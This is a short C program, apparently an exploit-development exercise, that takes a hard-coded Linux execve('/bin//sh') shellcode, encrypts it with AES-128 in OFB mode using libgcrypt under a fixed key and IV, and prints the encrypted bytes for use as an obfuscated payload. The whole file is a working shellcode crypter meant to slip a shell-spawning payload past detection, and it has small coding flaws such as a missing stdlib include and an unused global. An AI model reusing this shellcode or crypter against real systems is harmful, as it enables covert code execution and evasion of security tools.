#include <stdio.h>
#include <stdint.h>
#include <string.h>
#include <gcrypt.h>


char *key = "AbdulrahmanAlhsoahni";
char iv[] = "\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA";		 
char ctr[] = "\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA\xAA"; 

char shellcode[] = "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80";	// execve shellcode
char encShell[] = "";


void main()
{

    int myci = gcry_cipher_map_name("aes128");
    int size = strlen(shellcode);
    uint8_t *encShell = malloc(size);
    
    gcry_cipher_hd_t handler;
    gcry_cipher_open(&handler, myci, GCRY_CIPHER_MODE_OFB, 0);
    gcry_cipher_setkey(handler, key, 16);
    gcry_cipher_setiv(handler, iv, 16);
    gcry_cipher_setctr(handler, ctr, 16);
    gcry_cipher_encrypt(handler, encShell, size, shellcode, size);
    
    printf("[*]\tShellcode = ");
    int _;
    for( _ = 0 ; _ < size ; _++ )
    {
        printf("\\x%02x", encShell[_]);
    }
    printf("\n");

}
